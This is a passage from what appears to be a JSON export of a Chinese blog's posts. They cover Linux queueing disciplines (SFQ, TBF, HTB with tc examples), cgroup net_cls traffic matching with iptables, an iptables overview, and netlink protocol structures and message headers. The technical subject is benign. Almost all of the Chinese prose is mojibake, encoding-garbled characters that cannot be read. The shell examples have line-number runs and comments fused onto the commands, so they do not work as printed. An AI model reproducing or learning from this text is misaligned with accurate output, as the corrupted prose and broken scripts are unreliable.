é»˜è®¤æ˜¯ä½¿ç”¨ä¸‰ä¸ªé˜Ÿåˆ—ï¼Œèƒ½æä¾›åŸºæœ¬çš„ä¼˜å…ˆçº§åŠŸèƒ½ã€‚ SFQ çœ‹ä¸Šå»å…¬å¹³çš„ sfq sfq çš„å…¬å¹³æ˜¯ç”± hash ä¸è½®åºç®—æ³•ä¿è¯çš„ã€‚æ›´å¤šä¿¡æ¯ [è¿™é‡Œ](http://wiki.mikrotik.com/wiki/Manual:Queue#SFQ) tbf æ‹¿ç€ä»¤ç‰Œæ‰æ”¾è¡Œçš„ tbf å³ä½¿è¿™æ ·å¤šæ•°æƒ…å†µä¾ç„¶ä¸å¤Ÿï¼ æ¯”å¦‚â€A,B,C,D å››ä¸ªæœåŠ¡ï¼Œå…¶ä¸­ A æ˜¯å»¶è¿Ÿæ•æ„Ÿçš„è§†é¢‘ä¼šè®®ï¼ŒB æ˜¯ååé‡å¤§çš„ bt ä¸‹è½½ï¼ŒC,D æ™®é€šçš„ web æµé‡â€, ä¸Šé¢æä¾›çš„è¿™äº›åŠŸèƒ½æˆ–å¤šæˆ–å°‘åªèƒ½æ»¡è¶³ä¸€éƒ¨åˆ†æœåŠ¡ã€‚è¿™ä¸ªæ—¶å€™ä¸€ä¸ªå±‚æ¬¡åŒ–çš„åˆ’åˆ†é˜Ÿåˆ—è¢«å¼€å‘å‡ºæ¥äº†ï¼Œè™½ç„¶ linux ä¹Ÿå®ç°äº†å…¶å®ƒçš„æœ‰ç±»é˜Ÿåˆ—è§„åˆ™ï¼Œä½†æ˜¯ä»–ä»¬è¿œä¸å¦‚å…¶ä¸­çš„ HTB(Hierarchical Token Bucket) ä½¿ç”¨æ›´åŠ å¹¿æ³› [^packet_flow]. HTB htb å…è®¸åˆ›å»ºå±‚æ¬¡çš„é˜Ÿåˆ—ç»“æ„ä¸å†³å®šé˜Ÿåˆ—ä¹‹é—´çš„å…³ç³» (çˆ¶ - å­ï¼Œå­ - å­). ä¸€èˆ¬çš„ä½¿ç”¨æ­¥éª¤å¦‚ä¸‹ï¼š 1: åŒ¹é…å’Œæ ‡è®°æµé‡ï¼šå°†æµé‡åˆ†ç±»å¾…ä½¿ç”¨ï¼Œåˆ©ç”¨åŒ…å«ä¸€ä¸ªæˆ–è€…å¤šä¸ªåŒ¹é…å‚æ•°æ¥é€‰æ‹©æ•°æ®åŒ…æ„æˆä¸€ä¸ª class 2: åˆ›å»ºç­–ç•¥åˆ°æ ‡è®°çš„æµé‡ä¸Šï¼šæŠŠå…·ä½“çš„ class æ”¾åˆ°ç‰¹å®šçš„é˜Ÿåˆ—ä¸­å¹¶å®šä¹‰æ¯ä¸ª class æºå¸¦çš„åŠ¨ä½œã€‚ 3: é™„åŠ ç­–ç•¥åˆ°åˆ°ç‰¹å®šæ¥å£ï¼šé™„åŠ ç­–ç•¥åˆ°å…¨å±€æ¥å£ (å…¨å±€è¿›ï¼Œå…¨å±€å‡ºï¼Œå…¨å±€è¿›å‡º), ç‰¹å®šæ¥å£æˆ–è€…çˆ¶é˜Ÿåˆ—ã€‚ htb demo[^htb]: 1234567891011121314151617181920212223# This line sets a HTB qdisc on the root of eth0, and it specifies that # the class 1:30 is used by default. It sets the name of the root as 1:, for future references.tc qdisc add dev eth0 root handle 1: htb default 30# This creates a class called 1:1, which is direct descendant of root (the parent is 1:),# this class gets assigned also an HTB qdisc, and then it sets a max rate of 6mbits, with a burst of 15ktc class add dev eth0 parent 1: classid 1:1 htb rate 6mbit burst 15k# The previous class has this branches:# Class 1:10, which has a rate of 5mbittc class add dev eth0 parent 1:1 classid 1:10 htb rate 5mbit burst 15k# Class 1:20, which has a rate of 3mbittc class add dev eth0 parent 1:1 classid 1:20 htb rate 3mbit ceil 6mbit burst 15k# Class 1:30, which has a rate of 1kbit. This one is the default class.tc class add dev eth0 parent 1:1 classid 1:30 htb rate 1kbit ceil 6mbit burst 15k# Martin Devera, author of HTB, then recommends SFQ for beneath these classes:tc qdisc add dev eth0 parent 1:10 handle 10: sfq perturb 10tc qdisc add dev eth0 parent 1:20 handle 20: sfq perturb 10tc qdisc add dev eth0 parent 1:30 handle 30: sfq perturb 10 HTB ä½¿ç”¨ä¿¡æ¯ è¿™é‡Œ, ç†è®ºåŸºç¡€, å®ç°ç»†èŠ‚. å¯¹å‰é¢çš„QOSæœ‰äº†äº†è§£ï¼ŒåŠ ä¸Šåœ¨ 2014 å¹´netfilteræ”¯æŒäº†cgroupç‰¹æ€§ï¼Œç”¨æˆ·æ€éœ€è¦å®‰è£…æ–°çš„ iptables, è€Œåå¯ä»¥matchå‡ºcgroupç›¸å…³çš„æµé‡ï¼Œè¿™ä¸ªæ—¶å€™net_clsæ‰ç®—èƒ½å’Œnetfilterä¸€èµ·å·¥ä½œ [^net_cls_doc]. 1234567891011121314151617181920212223#!/bin/shINTERFACE=eno16777736# configuring tc:tc qdisc add dev $INTERFACE root handle 10: htb# creating traffic class 10:1 and configure the rate with 40mbittc class add dev $INTERFACE parent 10: classid 10:1 htb rate 40mbit# filter special traffictc filter add dev $INTERFACE parent 10: protocol ip prio 10 handle 1: cgroup# create new Hierarchyif [ ! -d /sys/fs/cgroup/net_cls/0 ]; then mkdir /sys/fs/cgroup/net_cls/0fi# send 0010:0001 to net_cls.classidecho 0x00100001 &gt; /sys/fs/cgroup/net_cls/0/net_cls.classid# use iptables to match cgroup traffic and drop it.iptables -A OUTPUT -m cgroup --cgroup 0x00100001 -j DROP [^access]: redhat access[^wiki]: wikipedia[^coolshell]: coolshell[^net_cls_doc]: cgroup net_cls doc[^linux_tc]: Linux taffic control[^linux_fw]: linux firewalls[^packet_flow]: MikroTik RouterOS packet flow[^qdisc]: classful qdiscs[^htb]: HTB[^example]: cgroup ä½¿ç”¨èŒƒä¾‹","tags":["linux"]},{"title":"iptables usage","path":"/2016/07/24/iptables/","content":"netfilter &amp; iptables Netfilter, åœ¨ Linux å†…æ ¸ä¸­çš„ä¸€ä¸ªè½¯ä»¶æ¡†æ¶ï¼Œç”¨äºç®¡ç†ç½‘ç»œæ•°æ®åŒ…ã€‚ä¸ä»…å…·æœ‰ç½‘ç»œåœ°å€è½¬æ¢ï¼ˆNATï¼‰çš„åŠŸèƒ½ï¼Œä¹Ÿå…·å¤‡æ•°æ®åŒ…å†…å®¹ä¿®æ”¹ã€ä»¥åŠæ•°æ®åŒ…è¿‡æ»¤ç­‰é˜²ç«å¢™åŠŸèƒ½ã€‚ ä»¥ä¸Šå†…å®¹å¼•è‡ª Wikipedia,netfilter åšä¸ºä¸€ä¸ªå†…æ ¸æ¡†æ¶ï¼Œå®ƒå¯ä»¥åœ¨ä¸åŒé˜¶æ®µå°†å‡½æ•°hookè¿›ç½‘ç»œæ ˆï¼Œæ¡†æ¶æœ¬èº«å¹¶ä¸å¤„ç†æ•°æ®åŒ… [^linux_fw]. iptables, ä¸€ä¸ªè¿è¡Œåœ¨ç”¨æˆ·ç©ºé—´çš„åº”ç”¨è½¯ä»¶ï¼Œé€šè¿‡æ§åˆ¶ Linux å†…æ ¸ netfilter æ¨¡å—ï¼Œæ¥ç®¡ç†ç½‘ç»œæ•°æ®åŒ…çš„æµåŠ¨ä¸è½¬é€ã€‚åœ¨å¤§éƒ¨åˆ†çš„ Linux ç³»ç»Ÿä¸Šé¢ï¼Œiptables æ˜¯ä½¿ç”¨ &#x2F;usr&#x2F;sbin&#x2F;iptables æ¥æ“ä½œï¼Œæ–‡ä»¶åˆ™æ”¾ç½®åœ¨æ‰‹å†Œé¡µï¼ˆMan page[2]ï¼‰åº•ä¸‹ï¼Œå¯ä»¥é€šè¿‡ man iptables æŒ‡ä»¤è·å–ã€‚ iptablesåšä¸ºä¸€ä¸ªç”¨æˆ·æ€å·¥å…·ï¼Œæä¾›ä¸€äº›æœ¯è¯­ (table,chain,match,target) å‡†ç¡®æè¿°äº†ä¸€äº›ç½‘ç»œç®¡ç†ï¼Œè¿™äº›æœ¯è¯­ç¦»å¼€iptablesä¸Šä¸‹æ–‡å¯èƒ½æ„ä¹‰ä¸ä¸€æ ·ã€‚ netflow æµè§ˆå™¨æ”¾å¤§çœ‹ iptablesé»˜è®¤æä¾›å››ä¸ªtable, ä¸åŒçš„tableå†…ç½®äº†ä¸åŒçš„chain, ä¸åŒchainæä¾›äº†ä¸è¿‘ç›¸åŒçš„target. filter: ç”¨äºåº”ç”¨è¿‡æ»¤è§„åˆ™ã€‚ nat: ç”¨äºåº”ç”¨åœ°å€è½¬åŒ–ã€‚ mangle: ç”¨äºä¿®æ”¹åˆ†ç»„æ•°æ®ã€‚ raw: æƒ³ç‹¬ç«‹ä¸ netfilter é“¾æ¥è·Ÿè¸ªå­ç³»ç»Ÿä½œç”¨çš„è§„åˆ™åº”ç”¨äºè¿™.(å¯ä»¥åœ¨å›¾é‡Œç”±rawè¡¨æ‰€åœ¨ä½ç½®ç¡®è®¤) å…·ä½“çš„çš„å„ä¸ªchainå¯¹æ•°æ®åŒ…çš„å¤„ç†æµç¨‹å¯ä»¥å‚è€ƒä¸Šå›¾ï¼Œæ•°æ®åŒ…å…ˆè¿›å…¥rawè¡¨çš„prerouteé“¾ï¼Œè€Œåè¿›å…¥mangleçš„prerouteé“¾ï¼Œå¦‚æ­¤æ¨ç†ã€‚ iptables demo[^example]:iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080 æŠŠé»˜è®¤ HTTP ç«¯å£çš„æ•°æ®åŒ…ç”± 80 è½¬å‘ 8080 ç«¯å£ï¼Œåœ¨è·¯ç”±å†³ç­–å‰è¢«å¤„ç†ï¼Œè€Œåè¿›å…¥mangleçš„inputåï¼Œåˆè¿›å…¥filterçš„inputäº¤ä¸ socket.-tå‚æ•°åé¢è®¤è¯†æ˜¯table,-Aè¡¨ç¤ºå¯¹åé¢çš„chainè¿›è¡Œå¢åŠ æ¡ç›®ï¼Œåœ¨å¾€åä¸€äº›äº‹matchè§„åˆ™ï¼Œ-jåé¢å°±æ˜¯target.","tags":["linux"]},{"title":"netlink protocol I","path":"/2016/07/21/netlink-i/","content":"0x00 Introduction0x01 what is netlink?netlink æ˜¯ä¸€ç§ç”¨æˆ·è¿›ç¨‹å’Œå†…æ ¸ï¼Œæˆ–è€…è¿›ç¨‹ä¹‹é—´çš„æ²Ÿé€šæœºåˆ¶ï¼Œä¸èƒ½ç”¨äºè·¨ä¸»æœºçš„æ²Ÿé€š ^manual. 0x02 the advantage of netlink?å¤šæ•°çš„ Linux å†…æ ¸æ€ç¨‹åºéƒ½éœ€è¦å’Œç”¨æˆ·ç©ºé—´çš„è¿›ç¨‹äº¤æ¢æ•°æ®ï¼Œä½†æ˜¯ä¼ ç»Ÿçš„ Unix çš„ IPC (å„ç±»ç®¡é“ã€æ¶ˆæ¯é˜Ÿåˆ—ã€å†…å­˜å…±äº«ã€ä¿¡å·é‡) æœºåˆ¶ä¸èƒ½ä¸ºè¿›ç¨‹ä¸å†…æ ¸é€šè®¯æä¾›è¶³å¤Ÿçš„æ”¯æŒ [^ibm1].ä¸è¿‡ Linux æä¾›äº†å¾ˆå¤šä¸å†…æ ¸æ²Ÿé€šçš„æ–¹æ³•å¦‚å†…æ ¸å¯åŠ¨å‚æ•°ã€æ¨¡å—å‚æ•°ä¸ sysfsã€sysctlã€ç³»ç»Ÿè°ƒç”¨ã€netlinkã€procfsã€seq_fileã€debugfs å’Œ relayfs[^ibm2]. æ²Ÿé€šæ–¹æ³• åº”ç”¨åœºæ™¯ å†…æ ¸å¯åŠ¨å‚æ•° å†…æ ¸å¼€å‘è€…å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼æ¥å‘å†…æ ¸ä¼ è¾“æ•°æ®ï¼Œä»è€Œæ§åˆ¶å†…æ ¸å¯åŠ¨è¡Œä¸ºã€‚ æ¨¡å—å‚æ•°ï¼Œsysfs å½“å†…æ ¸éƒ¨åˆ†å­ç³»ç»Ÿç¼–è¯‘æˆæ¨¡å—ï¼Œåˆ™å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œåœ¨æ’å…¥æ¨¡å—æ—¶ä¼ é€’å‚æ•°ï¼Œæˆ–åœ¨è¿è¡Œæ—¶ï¼Œé€šè¿‡ sysfs æ¥è®¾ç½®æˆ–è¯»å–æ¨¡å—æ•°æ®ã€‚ sysctl å…¶è¢«åº”ç”¨æ¥è®¾ç½®ä¸è·å–è¿è¡Œæ—¶å†…æ ¸çš„é…ç½®å‚æ•°ï¼Œé€šè¿‡è¿™ç§æ–¹å¼ï¼Œç”¨æˆ·åº”ç”¨å¯ä»¥åœ¨å†…æ ¸è¿è¡Œçš„ä»»ä½•æ—¶åˆ»æ¥æ”¹å˜å†…æ ¸çš„é…ç½®å‚æ•°ï¼Œä¹Ÿå¯ä»¥åœ¨ä»»ä½•æ—¶å€™è·å¾—å†…æ ¸çš„é…ç½®å‚æ•°ã€‚ ç³»ç»Ÿè°ƒç”¨ æ˜¯å†…æ ¸æä¾›ç»™åº”ç”¨ç¨‹åºçš„æ¥å£ï¼Œåº”ç”¨å¯¹åº•å±‚ç¡¬ä»¶çš„æ“ä½œå¤§éƒ¨åˆ†éƒ½æ˜¯é€šè¿‡è°ƒç”¨ç³»ç»Ÿè°ƒç”¨æ¥å®Œæˆçš„ã€‚ netlink æ˜¯ä¸€ç§åœ¨å†…æ ¸ä¸ç”¨æˆ·åº”ç”¨é—´è¿›è¡ŒåŒå‘æ•°æ®ä¼ è¾“çš„éå¸¸å¥½çš„æ–¹å¼ã€‚ procfs æ˜¯è¾ƒè€çš„ç”¨æˆ·æ€ä¸å†…æ ¸æ€çš„æ•°æ®äº¤æ¢æ–¹å¼ï¼Œå†…æ ¸å¾ˆå¤šæ•°æ®é€šè¿‡è¿™ç§æ–¹å¼æä¾›ç»™ç”¨æˆ·ï¼Œå†…æ ¸å¾ˆå¤šå‚æ•°ä¹Ÿæ˜¯é€šè¿‡è¿™ç§æ–¹å¼æ¥ç”¨æˆ·æ–¹ä¾¿è®¾ç½®ï¼Œä½†å…¶æœ‰ä¸€ä¸ªç¼ºé™·ï¼Œè‹¥è¾“å‡ºå†…å®¹å¤§äº 1 ä¸ªå†…å­˜é¡µï¼Œéœ€è¦å¤šæ¬¡è¯»ã€‚ debugfs åªæœ‰åœ¨éœ€è¦çš„æ—¶å€™ä½¿ç”¨ï¼Œå®ƒåœ¨éœ€è¦æ—¶é€šè¿‡åœ¨ä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»ºä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶æ¥å‘ç”¨æˆ·ç©ºé—´åº”ç”¨æä¾›è°ƒè¯•ä¿¡æ¯ã€‚ relayfs æ˜¯ä¸€ä¸ªå¿«é€Ÿçš„è½¬å‘ï¼ˆrelayï¼‰æ•°æ®çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒä»¥å…¶åŠŸèƒ½è€Œå¾—åã€‚å®ƒä¸ºé‚£äº›éœ€è¦ä»å†…æ ¸ç©ºé—´è½¬å‘å¤§é‡æ•°æ®åˆ°ç”¨æˆ·ç©ºé—´çš„å·¥å…·å’Œåº”ç”¨æä¾›äº†å¿«é€Ÿæœ‰æ•ˆçš„è½¬å‘æœºåˆ¶ã€‚ Netlink ç›¸å¯¹äºç³»ç»Ÿè°ƒç”¨ï¼Œioctl ä»¥åŠ &#x2F;proc æ–‡ä»¶ç³»ç»Ÿè€Œè¨€å…·æœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š ä¸ºäº†ä½¿ç”¨ netlink, ç”¨æˆ·ä»…éœ€è¦åœ¨ include&#x2F;linux&#x2F;netlink.h ä¸­å¢åŠ ä¸€ä¸ªæ–°ç±»å‹çš„ netlink åè®®å®šä¹‰å³å¯ï¼Œå¦‚ #define NETLINK_MYTEST 17 ç„¶åï¼Œå†…æ ¸å’Œç”¨æˆ·æ€åº”ç”¨å°±å¯ä»¥ç«‹å³é€šè¿‡ socket API ä½¿ç”¨è¯¥ netlink åè®®ç±»å‹è¿›è¡Œæ•°æ®äº¤æ¢ã€‚ä½†ç³»ç»Ÿè°ƒç”¨éœ€è¦å¢åŠ æ–°çš„ç³»ç»Ÿè°ƒç”¨ï¼Œioctl åˆ™éœ€è¦å¢åŠ è®¾å¤‡æˆ–æ–‡ä»¶ï¼Œé‚£éœ€è¦ä¸å°‘ä»£ç ï¼Œproc æ–‡ä»¶ç³»ç»Ÿåˆ™éœ€è¦åœ¨ &#x2F;proc ä¸‹æ·»åŠ æ–°çš„æ–‡ä»¶æˆ–ç›®å½•ï¼Œé‚£å°†ä½¿æœ¬æ¥å°±æ··ä¹±çš„ &#x2F;proc æ›´åŠ æ··ä¹±ã€‚ netlink æ˜¯ä¸€ç§å¼‚æ­¥é€šä¿¡æœºåˆ¶ï¼Œåœ¨å†…æ ¸ä¸ç”¨æˆ·æ€åº”ç”¨ä¹‹é—´ä¼ é€’çš„æ¶ˆæ¯ä¿å­˜åœ¨ socket ç¼“å­˜é˜Ÿåˆ—ä¸­ï¼Œå‘é€æ¶ˆæ¯åªæ˜¯æŠŠæ¶ˆæ¯ä¿å­˜åœ¨æ¥æ”¶è€…çš„ socket çš„æ¥æ”¶é˜Ÿåˆ—ï¼Œè€Œä¸éœ€è¦ç­‰å¾…æ¥æ”¶è€…æ”¶åˆ°æ¶ˆæ¯ï¼Œä½†ç³»ç»Ÿè°ƒç”¨ä¸ ioctl åˆ™æ˜¯åŒæ­¥é€šä¿¡æœºåˆ¶ï¼Œå¦‚æœä¼ é€’çš„æ•°æ®å¤ªé•¿ï¼Œå°†å½±å“è°ƒåº¦ç²’åº¦ã€‚ ä½¿ç”¨ netlink çš„å†…æ ¸éƒ¨åˆ†å¯ä»¥é‡‡ç”¨æ¨¡å—çš„æ–¹å¼å®ç°ï¼Œä½¿ç”¨ netlink çš„åº”ç”¨éƒ¨åˆ†å’Œå†…æ ¸éƒ¨åˆ†æ²¡æœ‰ç¼–è¯‘æ—¶ä¾èµ–ï¼Œä½†ç³»ç»Ÿè°ƒç”¨å°±æœ‰ä¾èµ–ï¼Œè€Œä¸”æ–°çš„ç³»ç»Ÿè°ƒç”¨çš„å®ç°å¿…é¡»é™æ€åœ°è¿æ¥åˆ°å†…æ ¸ä¸­ï¼Œå®ƒæ— æ³•åœ¨æ¨¡å—ä¸­å®ç°ï¼Œä½¿ç”¨æ–°ç³»ç»Ÿè°ƒç”¨çš„åº”ç”¨åœ¨ç¼–è¯‘æ—¶éœ€è¦ä¾èµ–å†…æ ¸ã€‚ netlink æ”¯æŒå¤šæ’­ï¼Œå†…æ ¸æ¨¡å—æˆ–åº”ç”¨å¯ä»¥æŠŠæ¶ˆæ¯å¤šæ’­ç»™ä¸€ä¸ª netlink ç»„ï¼Œå±äºè¯¥ neilink ç»„çš„ä»»ä½•å†…æ ¸æ¨¡å—æˆ–åº”ç”¨éƒ½èƒ½æ¥æ”¶åˆ°è¯¥æ¶ˆæ¯ï¼Œå†…æ ¸äº‹ä»¶å‘ç”¨æˆ·æ€çš„é€šçŸ¥æœºåˆ¶å°±ä½¿ç”¨äº†è¿™ä¸€ç‰¹æ€§ï¼Œä»»ä½•å¯¹å†…æ ¸äº‹ä»¶æ„Ÿå…´è¶£çš„åº”ç”¨éƒ½èƒ½æ”¶åˆ°è¯¥å­ç³»ç»Ÿå‘é€çš„å†…æ ¸äº‹ä»¶ï¼Œåœ¨åé¢çš„æ–‡ç« ä¸­å°†ä»‹ç»è¿™ä¸€æœºåˆ¶çš„ä½¿ç”¨ã€‚ å†…æ ¸å¯ä»¥ä½¿ç”¨ netlink é¦–å…ˆå‘èµ·ä¼šè¯ï¼Œä½†ç³»ç»Ÿè°ƒç”¨å’Œ ioctl åªèƒ½ç”±ç”¨æˆ·åº”ç”¨å‘èµ·è°ƒç”¨ã€‚ netlink ä½¿ç”¨æ ‡å‡†çš„ socket API, å› æ­¤å¾ˆå®¹æ˜“ä½¿ç”¨ï¼Œä½†ç³»ç»Ÿè°ƒç”¨å’Œ ioctl åˆ™éœ€è¦ä¸“é—¨çš„åŸ¹è®­æ‰èƒ½ä½¿ç”¨ã€‚ 0x03 netlink featurenetlink åªæ˜¯æ¡†æ¶æä¾›åŸºæœ¬çš„å’Œå†…æ ¸æ²Ÿé€šçš„åŠŸèƒ½ï¼Œå…·ä½“è¦åšçš„äº‹æƒ…ç”±åŸºäº netlink çš„å­åè®®åšã€‚è€Œå†…æ ¸ä¸­å·²ç»å­˜åœ¨åŸºäº netlink çš„å…·ä½“åè®®æœ‰Linux/include/uapi/linux/netlink.h: 1234567891011121314151617181920212223#define NETLINK_ROUTE 0\t/* Routing/device hook */#define NETLINK_UNUSED 1\t/* Unused number */#define NETLINK_USERSOCK\t2\t/* Reserved for user mode socket protocols\t*/#define NETLINK_FIREWALL\t3\t/* Unused number, formerly ip_queue */#define NETLINK_SOCK_DIAG\t4\t/* socket monitoring */#define NETLINK_NFLOG 5\t/* netfilter/iptables ULOG */#define NETLINK_XFRM 6\t/* ipsec */#define NETLINK_SELINUX 7\t/* SELinux event notifications */#define NETLINK_ISCSI 8\t/* Open-iSCSI */#define NETLINK_AUDIT 9\t/* auditing */#define NETLINK_FIB_LOOKUP\t10\t#define NETLINK_CONNECTOR\t11#define NETLINK_NETFILTER\t12\t/* netfilter subsystem */#define NETLINK_IP6_FW 13#define NETLINK_DNRTMSG 14\t/* DECnet routing messages */#define NETLINK_KOBJECT_UEVENT\t15\t/* Kernel messages to userspace */#define NETLINK_GENERIC 16/* leave room for NETLINK_DM (DM Events) */#define NETLINK_SCSITRANSPORT\t18\t/* SCSI Transports */#define NETLINK_ECRYPTFS\t19#define NETLINK_RDMA 20#define NETLINK_CRYPTO 21\t/* Crypto layer */#define NETLINK_INET_DIAG\tNETLINK_SOCK_DIAG 0x04 the architecture of netlink[^lwn] +---------------------+ +---------------------+ | (3) application \"A\" | | (3) application \"B\" | +------|--------------+ +--------------|------+ | | \\ / \\ / | | +-------|--------------------------------|-------+ | : : | user-space =====+ : (5) Kernel socket API : +================ | : : | kernel-space +--------|-------------------------------|-------+ | | +-----|-------------------------------|----+ | (1) Netlink subsystem | +---------------------|--------------------+ | +---------------------|--------------------+ | (2) Generic Netlink bus | +--|--------------------------|-------|----+ | | | +-------|---------+ | | | (4) Controller | / \\ +-----------------+ / \\ | | +------------------|--+ +--|------------------+ | (3) kernel user \"X\" | | (3) kernel user \"Y\" | +---------------------+ +---------------------+ 0x10 date struct0x11 netlink protocolåœ¨ linux å†…æ ¸ä¸­æ¯ä¸ªåè®®éƒ½éœ€è¦æ³¨å†Œä¸€ä¸ªnet_proto_familyå®ä¾‹ï¼Œè¯¥å‡½æ•°åŒ…å«ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œåœ¨åˆ›å»ºå±äºè¯¥åè®®æ—çš„ socket çš„æ—¶å€™è¢«è°ƒç”¨ï¼Œnetlink çš„è¿™ä¸ªå‡½æ•°æŒ‡é’ˆæ˜¯ netlink_create, è¯¥å‡½æ•°åˆ†é…ä¸€ä¸ªstruct sockçš„å®ä¾‹ï¼Œé€šè¿‡ socket-&gt;sk å…³è”åˆ° socket, ä¸è¿‡è¿™ä¸ªå‡½æ•°ä¸ä»…ä¸ºstruct sockåˆ†é…äº†ç©ºé—´ï¼Œä¹Ÿä¸ºnetlink_sockåˆ†é…äº†ç©ºé—´ã€‚ 12345678910111213141516struct netlink_sock &#123;\t/* struct sock has to be the first member of netlink_sock */\tstruct sock sk;\tu32 portid;\tu32 dst_portid;\tu32 dst_group;\tu32 flags;\tu32 subscriptions;\t...\twait_queue_head_t\twait;\tstruct netlink_callback\t*cb;\t...\tvoid (*netlink_rcv)(struct sk_buff *skb);\tvoid (*netlink_bind)(int group);\t...&#125;; çœç•¥äº†ä¸€éƒ¨åˆ†ä»£ç ï¼Œä¿ç•™äº†ä¸»é¢˜ã€‚å¯ä»¥çœ‹è§sockå®ä¾‹ç›´æ¥åµŒå…¥netlink_sockä¸­ï¼Œç»™å‡ºçš„ä¸€ä¸ªnetlinkå¥—æ¥å­—çš„struct sockå®ä¾‹ï¼Œä¸ä¹‹ç›¸å…³è”ï¼Œç‰¹å®šäºnetlinkçš„netlink_socketå®ä¾‹ï¼Œå¯ä»¥ä½¿ç”¨nlk_skè·å¾—ã€‚é“¾æ¥ä¸¤ç«¯çš„ç«¯å£ ID åˆ†åˆ«ä¿å­˜åœ¨portidå’Œdst_portidä¸­ã€‚netlink_rcvæ˜¯åœ¨socketæ¥å—åˆ°æ•°æ®æ—¶å€™è°ƒç”¨ã€‚ 0x12 the address of socketç±»ä¼¼äºå…¶ä½™ç½‘ç»œåè®®ï¼Œæ¯ä¸ªnetlinkå¥—æ¥å­—ä¹Ÿéœ€è¦åˆ†é…ä¸€ä¸ªåœ°å€ï¼Œä¸‹åˆ—struct sockaddrçš„å˜ä½“è¡¨ç¤ºnetlinkåœ°å€ï¼š 123456struct sockaddr_nl &#123;\t__kernel_sa_family_t\tnl_family;\t/* AF_NETLINK\t*/\tunsigned short\tnl_pad; /* zero */\t__u32 nl_pid; /* port ID\t*/\t__u32 nl_groups;\t/* multicast groups mask */&#125;; ä¸ºåŒºåˆ†å…·ä½“çš„å­åè®®å†…æ ¸ä½¿ç”¨äº† nl_family å­—æ®µï¼Œ&lt;netlink.h&gt;æŒ‡å®šäº†ä¸åŒçš„å‡ ç§æ—ï¼Œå°±æ˜¯ä¸Šé¢å…·ä½“ä½œç”¨éƒ¨åˆ†åˆ—å‡ºæ¥çš„ã€‚nl_pad æ˜¯å¯¹å…¶è¡¥å…¨æ€»æ˜¯ 0. nl_pid ä¸ºå‘é€æ¶ˆæ¯çš„è¿›ç¨‹ pid, è‹¥æ˜¯å¸Œæœ›å†…æ ¸å¤„ç†æˆ–è€…å¤šæ’­æ¶ˆæ¯åˆ™ç½® 0, å¦åˆ™ä¸ºå¤„ç†æ¶ˆæ¯çš„çº¿ç¨‹ç»„ id. å­—æ®µ nl_groups ç”¨äºæŒ‡å®šæ’­ç»„ï¼Œbind å‡½æ•°ç”¨äºæŠŠè°ƒç”¨è¿›ç¨‹åŠ å…¥åˆ°è¯¥å­—æ®µæŒ‡å®šçš„æ’­ç»„ï¼Œè‹¥æ˜¯ä¸º 0 è¡¨ç¤ºä¸åŠ å…¥ä»»ä½•æ’­ç»„ã€‚è‹¥æ˜¯ä¸€ä¸ªè¿›ç¨‹çš„å¤šä¸ªçº¿ç¨‹ä½¿ç”¨ netlink socket çš„æƒ…å†µï¼Œè¿›ç¨‹çš„å­—æ®µçš„ nl_pid å¯ä»¥è®¾ç½®ä¸ºå…¶ä»–å€¼ã€‚å› æ­¤å­—æ®µnl_pidå®é™…ä¸Šæœªå¿…æ˜¯è¿›ç¨‹ ID, å®ƒåªæ˜¯ç”¨äºåŒºåˆ†ä¸åŒçš„æ¥æ”¶è€…æˆ–å‘é€è€…çš„ä¸€ä¸ªæ ‡è¯†ï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®è‡ªå·±éœ€è¦è®¾ç½®è¯¥å­—æ®µã€‚ 0x13 message format Message Format: +----------|- - -|-------------|----|---------- | nlmsghdr | Pad | Payload |Pad | nlmsghdr +----------|- - -|-------------|----|---------- nlmsg_data(nlh)---^ ^ nlmsg_next(nlh)-----------------------+ ä¸€ä¸ªåŸºæœ¬çš„æ¶ˆæ¯å•å…ƒæœ‰ä¸¤ä¸ªéƒ¨åˆ†ç»„æˆï¼šå¤´éƒ¨ä¸ payload, ä¸”è¿™ä¸ª message å¯¹é½åˆ°NLMSG_ALIGNTO, ä¸€èˆ¬æ˜¯#define NLMSG_ALIGNTO\t4U. 0x14 netlink messages headerä¸åŒäº BSD å¥—æ¥å­—ï¼Œå¤´ä¿¡æ¯ä¸­çš„æ ‡è¯†å’Œç›®çš„åœ°éƒ½æ˜¯è‡ªåŠ¨ç”Ÿæˆï¼ŒNetlink æ¶ˆæ¯å¤´ï¼ˆç»“æ„ä½“ nlmsghdrï¼‰å¿…é¡»ç”±å‘é€æ–¹å‡†å¤‡å¥½ï¼Œå°±åƒ socket å·¥ä½œåœ¨ SOCK_RAW æ¨¡å¼ä¸‹ ä¸€æ ·ã€‚å°½ç®¡ SOCK_DGRAM è¢«ç”¨äºåˆ›å»ºå®ƒã€‚ 1234567struct nlmsghdr &#123; __u32 nlmsg_len;\t/* Length of message including header */ __u16 nlmsg_type;\t/* Message content */ __u16 nlmsg_flags;\t/* Additional flags */ __u32 nlmsg_seq;\t/* Sequence number */ __u32 nlmsg_pid;\t/* Sending process port ID */ &#125;; nlmsg_typeæ˜¯åŸºäºnetlinkçš„åè®®çš„ç§æœ‰çš„ï¼Œnetlinkåè®®ä¸å»æ£€æŸ¥å­åè®®ã€‚nlmsg_flagsçš„ç±»å‹éƒ½å®šä¹‰åœ¨netlink.hé‡Œé¢äº†ï¼Œä¸€èˆ¬æƒ…å†µä¸‹åªè¦å…³æ³¨ï¼šå¦‚æœæ¶ˆæ¯åŒ…å«ä¸€ä¸ªè¯·æ±‚ï¼Œè¦æ±‚æ‰§è¡Œç‰¹å®šçš„æ“ä½œ (è€Œä¸æ˜¯ä¼ è¾“ä¸€äº›çŠ¶æ€ä¿¡æ¯), é‚£ä¹ˆNLM_F_REQUESTå°†è¢«ç½®ä½ï¼Œè€ŒNLM_F_ACKè¦æ±‚åœ¨æ¥å—ä¸Šè¿°æ¶ˆæ¯å¹¶æˆåŠŸè¿”å›å¤„ç†è¯·æ±‚ä¹‹åå‘é€ä¸€ä¸ªack. æ ‡å‡†çš„ flages, å…¶ä½™çš„å¹¶æ²¡æœ‰åˆ—å‡ºäº†æ¥linux/include/uapi/linux/netlink.h. 